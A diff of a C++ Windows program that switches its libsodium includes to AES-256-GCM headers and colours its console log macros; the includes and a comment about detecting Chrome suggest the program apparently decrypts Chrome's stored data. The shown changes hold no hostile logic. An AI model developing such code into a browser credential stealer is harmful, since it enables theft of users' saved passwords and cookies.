@@ -9,7 +9,8 @@
 #include <locale>
 #include <codecvt>
 #include <sqlite3.h>
-#include <sodium.h>
+#include <sodium/core.h>
+#include <sodium/crypto_aead_aes256gcm.h>
 #include <vector>
 #include <fstream>
 #include <wincrypt.h>
@@ -18,6 +19,7 @@
 #pragma comment(lib, "Crypt32.lib")
 #pragma comment(lib, "Shell32.lib")
 #pragma comment(lib, "Advapi32.lib")
+
 
 //using namespace std;
 using json = nlohmann::json;
@@ -28,9 +30,15 @@ using json = nlohmann::json;
 #define EXIT_FAILURE 1
 #define EXIT_SUCCESS 0
 
-#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
-#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
-#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
+// ANSI escape codes for colors
+#define RESET   "\033[0m"
+#define PURPLE  "\033[35m"
+#define GREEN   "\033[32m"
+#define YELLOW  "\033[33m"
+
+#define okay(msg, ...) printf(GREEN "[+] " RESET msg "\n", ##__VA_ARGS__)
+#define warn(msg, ...) printf(PURPLE "[-] " RESET msg "\n", ##__VA_ARGS__)
+#define info(msg, ...) printf(YELLOW "[i] " RESET msg "\n", ##__VA_ARGS__)
 
 //Checks if Chrome is installed in the local machine.
 //@turn a bool stating if it is installed or not.
